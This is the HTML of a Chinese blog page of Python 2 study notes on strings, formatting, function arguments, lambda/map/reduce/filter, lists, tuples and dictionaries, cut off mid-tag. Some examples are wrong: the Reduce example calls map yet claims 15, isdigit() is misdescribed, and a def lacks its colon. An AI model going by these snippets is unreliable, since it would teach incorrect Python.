<h3 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h3><p>表现形式：<strong>‘str’ ‘’str’’ ‘’’str’’’</strong><br>三引号可以保留字符串中的所有格式信息<br>字符串加 <strong>r</strong>或<strong>R</strong> 前缀表示不使用转义字符而是原生字符</p>
<h2 id="字符串运算、索引、切片"><a href="#字符串运算、索引、切片" class="headerlink" title="字符串运算、索引、切片"></a>字符串运算、索引、切片</h2><h3 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h3><p>str1+str2 拼接字符串<br>str*3 重复字符串<br>str in string 判断包含</p>
<h3 id="字符串索引"><a href="#字符串索引" class="headerlink" title="字符串索引"></a>字符串索引</h3><p>从0开始，从前向后; str[0] 第一个字符<br>从-1开始，从后向前; str[-1] 倒数第一个字符</p>
<h3 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h3><p><strong>str[start:finish:countby]</strong> ———— 左闭右开<br>start: 切片开始位置，包括start索引对应字符（不设置，默认第一个字符）<br>finish: 切片结束位置，不包括end索引对应字符（不设置，默认最大索引+1）<br>countby：计数参数，若为2，隔一个字符取一个字符；若为-1，获得逆序输出（不设置，默认为1）ps.对于前两者参数有要求，start索引位置要位于end后，且符号相同</p>
<h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><ul>
<li><strong>dir(变量类型)</strong><br>  查看该变量类型所有方法</li>
<li><a href="http://www.runoob.com/python/att-string-replace.html" target="_blank" rel="external">str.replace(old,new)</a><br>  生成一个新的字符串，用new替换所有old;可设定替换次数：max</li>
<li><a href="http://www.runoob.com/python/att-string-find.html" target="_blank" rel="external">str.find(str)</a><br>  返回第一次出现子串的下标，找不到则返回-1;可设定查找范围：beg，end</li>
<li><strong>str.isdigit()</strong><br>  字符串是否包含数字，ture，false</li>
<li><a href="http://www.runoob.com/python/att-string-count.html" target="_blank" rel="external">str.count(sub,start=0,end=len(string))</a><br>  统计字符串内子串出现的次数；可以设定范围;左闭右开，len(string) != -1;</li>
<li><strong>str.strip()</strong><br>  去掉字符串开始和结尾的空格回车;可设定自定义字符串sub,移除字符串中字符</li>
<li><a href="http://www.runoob.com/python/att-string-split.html" target="_blank" rel="external"><strong>str.split()</strong></a><br>  str.split(分隔符，分割次数)<br>  返回分割后的字符串列表，分隔符默认是所有空格（空格、换行、制表符等）</li>
<li><strong>str.title()</strong><br>  生成一个新的字符串,所有单词首字母大写其他字母小写</li>
<li><strong>str.capitalize()</strong><br>  生成一个新的字符串,首字母大写其余小写（只有第一个字母）</li>
<li><strong>str.upper()</strong><br>  生成一个新的字符串,全部大写</li>
<li><strong>str.lower()</strong><br>  生成一个新的字符串,全部小写</li>
</ul>
<h2 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h2><p>字符串格式化输出 有两种方法：str.format()函数和类似C语言的%形式</p>
<h3 id="str-format"><a href="#str-format" class="headerlink" title="str.format()"></a><strong>str.format()</strong></h3><p>利用 <strong>{} :</strong> 两个符号格式化字符串：<strong>{}</strong>设定参数位置, <strong>:</strong>设定参数格式<br><strong>{}</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1.通过位置设定参数，可多次使用位置</div><div class="line">    &apos;&#123;1&#125;&#123;0&#125;&#123;1&#125;&apos;.format(1,2)  ==&gt; &apos;212&apos;</div><div class="line">    使用列表</div><div class="line">    &gt;&gt;&gt; li = [&apos;hoho&apos;,18]</div><div class="line">        &apos;my name is &#123;&#125; ,age &#123;&#125;&apos;.format(*li)</div><div class="line">        &apos;my name is hoho ,age 18&apos;</div><div class="line">2.通过关键词设定参数（关键词不能为数字）</div><div class="line">    &apos;&#123;name&#125;&#123;id&#125;&apos;.format(id=&apos;1&apos;,name=&apos;2&apos;) ===&gt; &apos;21&apos;</div><div class="line">    使用字典</div><div class="line">    &gt;&gt;&gt; hash = &#123;&apos;name&apos;:&apos;hoho&apos;,&apos;age&apos;:18&#125;</div><div class="line">        &apos;my name is &#123;name&#125;,age is &#123;age&#125;&apos;.format(**hash)</div><div class="line">        &apos;my name is hoho,age is 18&apos;</div></pre></td></tr></table></figure></p>
<p><strong>:</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.填充与对齐</div><div class="line">    **&#123;:(填充字符)(对齐方式)(宽度)&#125;**</div><div class="line">    填充字符： 只能指定一个字符，不指定的话默认使用空格</div><div class="line">    对齐方式： ^ &lt; &gt; 分别是 居中，左对齐，右对齐</div><div class="line">    宽度： 总宽度;（宽度奇数，居中偏左；宽度过小，不填充）</div><div class="line">    `&apos;&#123;:*&gt;8&#125;&apos;.format(&apos;2015&apos;)`</div><div class="line">2.精度与类型</div><div class="line">    **&#123;:(.精度长度)f&#125;**</div><div class="line">    .(精度长度): 长度为X的精度(4舍5入) 只能与f一起用</div><div class="line">    类型：f(float) </div><div class="line">    `&apos;&#123;:.2f&#125;&apos;.format(3.12342)`</div><div class="line">    **&#123;:(类型)&#125;**</div><div class="line">    b(二进制) o(八进制) d(十进制) x(十六进制) float类型无法用b 0 d x 表示</div><div class="line">    ,(金额的千位分隔符) float类型留一位小数</div><div class="line">    `&apos;&#123;:d&#125;.format(2015)&apos;`</div><div class="line">结合：`&apos;&#123;:0&gt;8.2f&#125;&apos;.format(0.33)`</div></pre></td></tr></table></figure></p>
<h3 id="“”"><a href="#“”" class="headerlink" title="“” % ( )"></a>“” % ( )</h3><p>另一种格式化字符串方法<br>例子<br><code>&quot;abc %s&quot; % (&#39;abc&#39;)</code><br>格式符——控制位置和格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">%%    字符&quot;%&quot;</div><div class="line">%s    字符串 (采用str()的显示)</div><div class="line">%r    字符串 (采用repr()的显示)</div><div class="line">%c    单个字符</div><div class="line">%b    二进制整数</div><div class="line">%d    十进制整数</div><div class="line">%i    十进制整数</div><div class="line">%o    八进制整数</div><div class="line">%x    十六进制整数</div><div class="line">%e    指数 (基底写为e)</div><div class="line">%E    指数 (基底写为E)</div><div class="line">%f    浮点数</div><div class="line">%F    浮点数，与上相同</div><div class="line">%g    指数(e)或浮点数 (根据显示长度)</div><div class="line">%G    指数(E)或浮点数 (根据显示长度)</div></pre></td></tr></table></figure></p>
<p>添加格式控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">%[(name)][flags][width].[precision]类型</div><div class="line">(name)为命名</div><div class="line">flags：可以有**-,&apos; &apos;或0**。</div><div class="line">    不填写flags表示右对齐。</div><div class="line">    **-**：表示左对齐。</div><div class="line">    **&apos; &apos;**：为一个空格，表示在正数的左侧填充一个空格，从而与负数对齐。</div><div class="line">    **0**：表示使用0填充。</div><div class="line">width：表示显示宽度，可以用*代替，在%后面作为参数填充</div><div class="line">precision：表示小数点后精度，可以用*代替，在%后面作为参数填充</div></pre></td></tr></table></figure></p>
<h2 id="类型转换函数"><a href="#类型转换函数" class="headerlink" title="类型转换函数"></a>类型转换函数</h2><p>字符与整数的转换（一个字符与ascii码）<br>字符转整数：ord()<br>整数转字符：chr()</p>
<h2 id="python2-x关键词"><a href="#python2-x关键词" class="headerlink" title="python2.x关键词"></a>python2.x关键词</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">and del from not while as</div><div class="line">elif global or with assert</div><div class="line">else if pass yield break </div><div class="line">except import print class exec</div><div class="line">in raise continue finally is</div><div class="line">return def for lambda try</div></pre></td></tr></table></figure>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>函数的参数可以设置默认值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span>:</span></div><div class="line">    <span class="keyword">print</span> a,b,c</div><div class="line">test()        <span class="comment"># 123</span></div></pre></td></tr></table></figure></p>
<p>4种静态函数调用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(a,b,c)</span>:</span></div><div class="line">    <span class="keyword">print</span> a,b,c</div><div class="line"><span class="comment">#元组x</span></div><div class="line">x = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</div><div class="line"><span class="comment">#字典xx</span></div><div class="line">xx=&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>,<span class="string">'c'</span>:<span class="number">3</span>&#125;</div><div class="line"></div><div class="line">test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)       <span class="comment">#123</span></div><div class="line">test(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment">#123 abc为函数变量，填错报错</span></div><div class="line">test(*x)          <span class="comment">#123 元组转变，相当于式子1 ； list列表也可</span></div><div class="line">test(**xx)        <span class="comment">#123 字典转变，相当于式子2</span></div></pre></td></tr></table></figure></p>
<p>2种动态参数调用<br>*arg<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">(*args)</span>:</span></div><div class="line">    <span class="keyword">print</span> type(args)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> args:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line"></div><div class="line">test2(<span class="number">1</span>)</div><div class="line">test2(<span class="number">1</span>,<span class="string">'a'</span>,<span class="keyword">None</span>)</div><div class="line">a=(<span class="number">1</span>,<span class="string">'a'</span>,<span class="keyword">None</span>)</div><div class="line">test2(*a)</div><div class="line"><span class="comment"># &lt;type 'tuple'&gt;</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># &lt;type 'tuple'&gt;</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># a</span></div><div class="line"><span class="comment"># None</span></div><div class="line"><span class="comment"># &lt;type 'tuple'&gt;</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># a</span></div><div class="line"><span class="comment"># None</span></div></pre></td></tr></table></figure></p>
<p>**arg<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test3</span><span class="params">(**args)</span>:</span></div><div class="line">    <span class="keyword">print</span> type(args)</div><div class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> args.items():</div><div class="line">        <span class="keyword">print</span> k,v</div><div class="line">dic=&#123;<span class="string">'k1'</span>:<span class="number">1</span>,<span class="string">'k2'</span>:<span class="string">'a'</span>&#125;</div><div class="line">test3(k1=<span class="number">1</span>)</div><div class="line">test3(k1=<span class="number">1</span>,k2=<span class="string">'a'</span>)</div><div class="line">test3(**dic)</div><div class="line"><span class="comment"># &lt;type 'dict'&gt;</span></div><div class="line"><span class="comment"># k1 1</span></div><div class="line"><span class="comment"># &lt;type 'dict'&gt;</span></div><div class="line"><span class="comment"># k2 a</span></div><div class="line"><span class="comment"># k1 1</span></div><div class="line"><span class="comment"># &lt;type 'dict'&gt;</span></div><div class="line"><span class="comment"># k2 a</span></div><div class="line"><span class="comment"># k1 1</span></div></pre></td></tr></table></figure></p>
<p>两种动态参数混用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test4</span><span class="params">(*arg1,**arg2)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg1:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> arg2.items():</div><div class="line">        <span class="keyword">print</span> k,v</div><div class="line">test4(<span class="number">1</span>)</div><div class="line">test4(k1=<span class="number">1</span>)</div><div class="line">test4(<span class="number">100</span>,<span class="number">200</span>,k3=<span class="keyword">True</span>)</div><div class="line">a=(<span class="number">100</span>,<span class="number">200</span>)</div><div class="line">b=&#123;<span class="string">'k3'</span>:<span class="keyword">True</span>&#125;</div><div class="line">test4(a,b)</div><div class="line">test4(*a,**b)</div><div class="line"><span class="comment"># 1</span></div><div class="line"></div><div class="line"><span class="comment"># k1 1</span></div><div class="line"></div><div class="line"><span class="comment"># 100</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># k3 True</span></div><div class="line"><span class="comment">####下一个输出结果：a,b 被*arg1编成元组 ((100, 200), &#123;'k3': True&#125;)</span></div><div class="line"><span class="comment">####都在第一个for中输出</span></div><div class="line"><span class="comment"># (100, 200)</span></div><div class="line"><span class="comment"># &#123;'k3': True&#125;</span></div><div class="line"></div><div class="line"><span class="comment"># 100</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># k3 True</span></div></pre></td></tr></table></figure></p>
<p>静态动态混用<br><em>arg1 *</em>arg2 可以不填参数，arg必须填<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test5</span><span class="params">(arg,*arg1,**arg2)</span>:</span></div><div class="line">    <span class="keyword">print</span> arg</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg1:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> arg2.items():</div><div class="line">        <span class="keyword">print</span> k,v</div><div class="line">a=(<span class="number">100</span>,<span class="number">200</span>)</div><div class="line">b=&#123;<span class="string">'k3'</span>:<span class="keyword">True</span>&#125;</div><div class="line">test5(<span class="number">1</span>)</div><div class="line">test5(<span class="number">1</span>,*a,**b)</div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># 100</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># k3 True</span></div></pre></td></tr></table></figure></p>
<h3 id="Lambda函数"><a href="#Lambda函数" class="headerlink" title="Lambda函数"></a>Lambda函数</h3><p>Lambda函数——快速定义单行函数<br><strong>lambda (输入参数)：表达式</strong><br>输入参数：可以有多个，’,’隔开<br>表达式：表达式的处理结果为返回值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f=<span class="keyword">lambda</span> x,y:x+y</div><div class="line"><span class="keyword">print</span> f(<span class="number">4</span>,<span class="number">5</span>) <span class="comment">#9</span></div></pre></td></tr></table></figure></p>
<h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><p>map函数——序列映射函数<br><strong>Map(函数，序列)</strong><br>函数：一个函数<br>序列：可以多个<br>返回：处理后的对应序列<br>多个序列输入到一个函数返回一个序列<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line">n=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line"><span class="keyword">print</span> map(<span class="keyword">lambda</span> x,y:x+y,m,n)</div><div class="line"><span class="comment">#[2, 4, 6, 8, 10]</span></div></pre></td></tr></table></figure></p>
<h3 id="Reduce函数"><a href="#Reduce函数" class="headerlink" title="Reduce函数"></a>Reduce函数</h3><p>Reduce函数——序列叠加函数<br><strong>Reduce(函数,序列)</strong><br>函数：一个函数<br>序列：一个序列<br>返回：值<br>从序列中从左到右依次取数，进入函数，返回值作为第一个参数继续进入，如此叠加<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line"><span class="keyword">print</span> map(<span class="keyword">lambda</span> x,y:x+y,m)</div><div class="line"><span class="comment">#15</span></div></pre></td></tr></table></figure></p>
<h3 id="Filter函数"><a href="#Filter函数" class="headerlink" title="Filter函数"></a>Filter函数</h3><p>Filter函数——过滤函数<br><strong>filter(函数，序列)</strong><br>函数：一个函数<br>序列：一个序列<br>返回 函数返回结果为真的值 组成的序列<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line"><span class="keyword">print</span> filter(<span class="keyword">lambda</span> x:x%<span class="number">2</span>,m)</div><div class="line"><span class="comment">#[1, 3, 5] 此处是奇数返回1</span></div></pre></td></tr></table></figure></p>
<h3 id="Eval-函数"><a href="#Eval-函数" class="headerlink" title="Eval()函数"></a>Eval()函数</h3><p><strong>eval(str)</strong><br>str：字符串<br>将字符串str当成有效的表达式来求值并返回计算结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m=<span class="string">"1+2"</span></div><div class="line"><span class="keyword">print</span> eval(m)</div><div class="line"><span class="comment">#3</span></div></pre></td></tr></table></figure></p>
<h2 id="列表（序列、List）"><a href="#列表（序列、List）" class="headerlink" title="列表（序列、List）"></a>列表（序列、List）</h2><p>动态数组，有序<br>数组的值可以是任意类型<br>字符串运算、索引、切片同样适用</p>
<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成列表,创建列表副本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a=[<span class="number">1</span>,<span class="string">'a'</span>,[<span class="string">'abc'</span>,<span class="number">1</span>],<span class="number">3</span>] <span class="comment"># 可嵌套</span></div><div class="line"><span class="comment">##列表解析 [表达式 for 变量 in 列表 if 条件]</span></div><div class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)] <span class="comment"># 0-9</span></div><div class="line">a=[x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>)] <span class="comment"># 1,4,9,16,25</span></div><div class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>] <span class="comment"># [2,4]</span></div><div class="line"><span class="comment">##列表副本</span></div><div class="line">b=a    <span class="comment"># b和a指向同一地址，牵一发而动全身</span></div><div class="line">b=a[:] <span class="comment"># b为一个新的列表不是跟a指向同一地址，就是切片[0:len(a)]，切片是生成新的列表</span></div></pre></td></tr></table></figure></p>
<p>添加、删除、插入（不返回新列表，在原列表操作）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">list=[<span class="number">1</span>,<span class="number">2</span>]</div><div class="line">list.append(<span class="number">3</span>) <span class="comment"># [1,2,3]</span></div><div class="line">list.append([<span class="number">3</span>,<span class="number">4</span>]) <span class="comment"># [1,2,[3,4]]</span></div><div class="line">list.remove(<span class="number">1</span>) <span class="comment"># [2,[3,4]]  删除对应的值，不是索引，多相同值，移除接近头的</span></div><div class="line">list.insert(<span class="number">1</span>,<span class="number">-1</span>) <span class="comment"># [2,-1,[3,4]] 在索引为1的位置插入-1</span></div></pre></td></tr></table></figure></p>
<p>取尾元素、反转、排序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">list=[<span class="number">2</span>,<span class="number">-1</span>,<span class="number">3</span>]</div><div class="line">list.pop() <span class="comment"># [2,-1] 返回尾元素 list删除尾元素</span></div><div class="line">list.reverse() <span class="comment"># [-1,2]  在原列表操作</span></div><div class="line">re = list[::<span class="number">-1</span>] <span class="comment"># [-1,2]</span></div><div class="line">a=[<span class="number">-3</span>,<span class="number">1</span>,<span class="number">2</span>]</div><div class="line">a.sort() <span class="comment"># [-3，1,2] 默认从小到大</span></div><div class="line">sorted(a) <span class="comment"># [-3，1,2]</span></div><div class="line">a.sort(key=abs) <span class="comment"># [1,2,-3]</span></div><div class="line">a.sort(key=<span class="keyword">lambda</span> x : <span class="number">1</span>/x) <span class="comment"># [-3,2,1]</span></div></pre></td></tr></table></figure></p>
<h3 id="enumerate-函数"><a href="#enumerate-函数" class="headerlink" title="enumerate()函数"></a>enumerate()函数</h3><p>为可遍历对象提供索引<br>返回[(索引0，值0),(索引1，值1)……]<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</div><div class="line"><span class="keyword">for</span> index,value <span class="keyword">in</span> enumerate(m):</div><div class="line">    <span class="keyword">print</span> index,value</div><div class="line"><span class="comment"># 0 1</span></div><div class="line"><span class="comment"># 1 2</span></div><div class="line"><span class="comment"># 2 3</span></div><div class="line"><span class="comment"># 3 4</span></div></pre></td></tr></table></figure></p>
<h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">x=[[<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">7</span>],[<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</div><div class="line"><span class="keyword">print</span> x[<span class="number">2</span>][<span class="number">1</span>]  <span class="comment"># 1 第三行第二个</span></div><div class="line"><span class="keyword">print</span> len(x)   <span class="comment"># 3 行数</span></div><div class="line"><span class="keyword">print</span> len(x[<span class="number">0</span>]) <span class="comment"># 4 列数</span></div></pre></td></tr></table></figure>
<h3 id="列表实例"><a href="#列表实例" class="headerlink" title="列表实例"></a>列表实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#一行输入多个数，保存在列表中</span></div><div class="line"><span class="comment">#raw_input() 默认是字符串 .split() 返回的是列表，列表的数据是字符</span></div><div class="line">a=[int(i) <span class="keyword">for</span> i <span class="keyword">in</span> raw_input(<span class="string">"输入多个数,空格分割"</span>).split()]</div><div class="line"><span class="keyword">print</span> a  <span class="comment">#[1, 2, 3, 4]</span></div></pre></td></tr></table></figure>
<h2 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h2><p>静态数组，不能修改，长度固定<br>索引，切片，len适用<br>元组与列表可以嵌套</p>
<h3 id="基础操作-1"><a href="#基础操作-1" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成元组,赋值，交换<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#生成</span></div><div class="line">a=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>   <span class="comment">#(1, 2, 3, 4)</span></div><div class="line">b=(<span class="number">5</span>,<span class="string">'a'</span>,<span class="number">7.0</span>,<span class="number">8</span>) <span class="comment">#(5, 'a', 7.0, 8)</span></div><div class="line"><span class="comment">#赋值</span></div><div class="line">b=a <span class="comment"># (1, 2, 3, 4)  因为不能修改 无所谓地址不地址吧？</span></div><div class="line"><span class="comment">#交换</span></div><div class="line">a,c = c,a  <span class="comment">#相当于（a,c）=(c,a) 所以a,c 可以是任意类型</span></div><div class="line">a,c=<span class="string">'1 3'</span>.split() <span class="comment">#，的其他用法，但是此时得到a,c就不是元组</span></div><div class="line"><span class="keyword">print</span> a <span class="comment"># 1</span></div><div class="line"><span class="keyword">print</span> c <span class="comment"># 3</span></div></pre></td></tr></table></figure></p>
<h3 id="元组实例"><a href="#元组实例" class="headerlink" title="元组实例"></a>元组实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x,y)</span></span></div><div class="line">    return x,y,x+y</div><div class="line">x,y,z=add(<span class="number">6</span>,<span class="number">7</span>)</div><div class="line"><span class="keyword">print</span> x,y,z <span class="comment"># 6 7 13</span></div></pre></td></tr></table></figure>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>键值对<br>不支持切片，索引</p>
<h3 id="基础操作-2"><a href="#基础操作-2" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成,访问,添加，删除<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#键不可重复不可变，数字，字符串，元组，不能是列表（可变）</span></div><div class="line"> <span class="comment">#值是任意类型</span></div><div class="line"><span class="comment">#生成</span></div><div class="line">dic=&#123;<span class="string">'name'</span>:<span class="string">'lala'</span>,<span class="string">'id'</span>:<span class="number">1</span>&#125; <span class="comment">#键名是字符串需要''</span></div><div class="line">a=dict(name=<span class="string">'liming'</span>,age=<span class="number">20</span>) <span class="comment">#键名是字符串不需要''</span></div><div class="line"><span class="comment">#访问</span></div><div class="line"><span class="keyword">print</span> dic[<span class="string">'name'</span>] <span class="comment"># lala</span></div><div class="line"><span class="comment">#添加更新</span></div><div class="line">dic[<span 